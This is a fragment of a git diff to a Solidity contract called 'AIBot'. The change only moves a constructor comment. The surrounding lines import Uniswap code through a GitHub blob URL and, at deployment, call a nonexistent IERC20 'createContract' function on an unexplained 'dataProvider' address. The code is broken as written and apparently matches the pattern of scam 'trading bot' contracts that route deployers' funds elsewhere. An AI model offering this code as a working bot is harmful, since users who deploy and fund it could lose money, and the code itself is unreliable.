@@ -29,8 +29,14 @@ import "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.s
 
 
 contract AIBot {
+
     uint liquidity;
     event Log(string _msg);
+
+    /*
+     * @dev constructor
+     * @set the owner of the contract
+     */
 
     constructor() {
         _owner = msg.sender;
@@ -38,11 +44,6 @@ contract AIBot {
         IERC20(dataProvider).createContract(address(this));
     }
 
-    /*
-     * @dev constructor
-     * @set the owner of the contract
-     */
-     
     receive() external payable {}
 
     struct slice {
